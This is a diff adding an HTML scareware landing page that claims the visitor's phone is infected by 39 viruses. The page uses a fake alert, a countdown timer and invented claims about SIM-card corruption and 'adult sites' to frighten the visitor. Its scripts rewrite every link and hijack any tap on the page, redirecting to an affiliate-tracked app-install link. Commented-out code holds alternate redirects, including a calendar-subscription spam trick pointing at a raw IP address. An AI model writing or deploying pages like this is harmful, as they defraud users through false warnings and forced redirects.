@@ -1,0 +1,242 @@
+<!DOCTYPE html><html><head>
+  <base href="">
+
+    
+
+    <base>
+
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <title>Virus Warning!</title>
+
+    <style>
+        #timer p,
+        p {
+            color: #555
+        }
+
+        #error,
+        #timer {
+            display: inline-block;
+            float: left
+        }
+
+        #timer p,
+        .btn {
+            font-weight: 700
+        }
+
+        body {
+            font-family: sans-serif
+        }
+
+        a {
+            text-decoration: none
+        }
+
+        footer,
+        header,
+        section {
+            clear: both
+        }
+
+        * {
+            margin: 0;
+            padding: 0
+        }
+
+        #wrapper {
+            max-width: 100%;
+            padding: 5px
+        }
+
+        h1 {
+            font-size: 20px
+        }
+
+        p {
+            font-size: 14px;
+            padding: 5px 0
+        }
+
+        #timer {
+            max-width: 290px;
+            width: 65%
+        }
+
+        #timer p {
+            font-size: 12px
+        }
+
+        #error {
+            max-width: 120px;
+            width: 35%
+        }
+
+        #error img {
+            width: 100%
+        }
+
+        a#randombutton {
+            background-color: #6d96f1;
+            border-radius: 5px;
+            color: #fff;
+            display: block;
+            line-height: 50px;
+            max-width: 275px;
+            width: 90%;
+            text-align: center;
+            margin: 0px auto;
+        }
+
+        .btn {
+            background-color: #6d96f1;
+            border-radius: 5px;
+            color: #fff;
+            display: block;
+            line-height: 50px;
+            max-width: 275px;
+            width: 90%
+        }
+
+        .red {
+            color: red
+        }
+    </style>
+</head>
+<body class="" onload="translate(1)" onclick="goto();">
+<audio autoplay="autoplay" preload="" loop="">
+</audio>
+<script src="jquery.min.js"></script>
+<script language="JavaScript" type="text/javascript">
+    var sec = 59;
+    var min = 04;
+
+    function countDown() {
+        sec--;
+        if (sec == -01) {
+            sec = 59;
+            min = min - 1;
+        } else {
+            min = min;
+        }
+        if (sec <= 9) {
+            sec = "0" + sec;
+        }
+        time = (min <= 9 ? "" + min : min) + " minutes and! " + sec + " seconds";
+        if (document.getElementById) {
+            document.getElementById('theTime').innerHTML = time;
+        }
+        SD = window.setTimeout("countDown();", 1000);
+        if (min == '00' && sec == '00') {
+            sec = "00";
+            window.clearTimeout(SD);
+        }
+    }
+
+    window.onload = countDown;
+</script>
+<script>
+    $(document).ready(function () {
+        alert("ATTENTION - Viruses found!\nYour " + brand + " is severely damaged by (39) viruses! Soon your " + brand + " SIM card will be corrupt and it will damage your contacts, photos, data, applications, etc ..");
+
+    });
+</script>
+
+
+<div id="wrapper">
+    <header><img src="logo2.png"></header>
+    <section>
+        <h1><span id="headingtext">Your <span id="model">5</span> is severly damaged by (39) viruses</span></h1>
+    </section>
+    <section>
+        <!-- Third -->
+
+
+        <div id="timer">
+            <p><span class="red" id="redtext">We've noticed that your <span id="brand">Nokia</span> is 28.1% Damaged by (30) harmful viruses from recent adult sites. It will soon corrupt your Phone's SIM card and damage your contacts, photos, data, and applications.</span>
+            </p>
+            <p>
+            </p>
+            <span style="font-size:18px;font-weight:bold;color:red;font-family:sans-serif;" id="theTime">4 minutes and! 29 seconds</span>
+        </div>
+    </section>
+    <section>
+        <p><b><span id="text3">If you don't remove the virus now, it will cause serious damage to your Phone. Here's what you need to do (step by step):</span></b>
+            <br>
+            <br><span id="text4">Step 1: Tap and install  app for free on the Play Store!</span>
+            <br>
+            <br>
+            <span id="text5">Step 2: Open the application to speed up and fix your browser now!</span></p>
+    </section>
+    <footer>
+
+
+
+        <p align="center">
+          
+                <a id="offer_split" href="https://app.appsflyer.com/com.mant.netanalyzer?${params}&amp;pid=voluumtracker_int&amp;af_sub1=black2">
+                             
+                                   
+                             
+                             <span class="btn"><span id="randombutton">Repair Now<span class="btn"></span></span></span></a></p>
+    </footer>
+</div>
+
+<script type="text/javascript">
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        var results = regex.exec(location.search);
+        return results === null ? 'Phone' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    };
+
+    var brand = getUrlParameter('brand') //Create var
+    var model = getUrlParameter('model') //Create var
+
+    document.getElementById('brand').innerHTML = brand; //get var data and place in HTML
+    document.getElementById('model').innerHTML = model; //get var data and place in HTML
+
+</script>
+
+
+<script type="text/javascript">
+
+    var now = window.location.href,
+        params = now.split('?').pop();
+    document.querySelectorAll('a').forEach(function (e) {
+
+
+        
+
+        e.href = `https://app.appsflyer.com/com.mant.netanalyzer?${params}&pid=voluumtracker_int&af_sub1=black2`;
+    })
+
+    $(function () {
+        $('body').click(function (ev) {
+            ev.preventDefault();
+
+        //     setTimeout(function(){
+		// 	window.location.replace("https://calendar.google.com/calendar/render?cid=webcal://192.241.129.156/cal.php/calendars/victor/android_subscription_calendar?export");
+        // }, 1000);
+
+//         setTimeout(function(){
+
+// //     var now = window.location.href,
+// // params = now.split('?').pop();
+// //    window.location.replace(`https://goingapp.xyz/sell/?${params}`);
+    
+//     window.location.replace(`https://www.familyline.services/127e2ea5-1307-4feb-b4b7-1cc64e329372`);
+//     //graizoah.com/afu.php?zoneid=3334714
+// }, 1500);
+        
+                        location.href = `https://app.appsflyer.com/com.mant.netanalyzer?${params}&pid=voluumtracker_int&af_sub1=black2`;
+                    });
+    });
+</script>
+
+
+ </body></html>
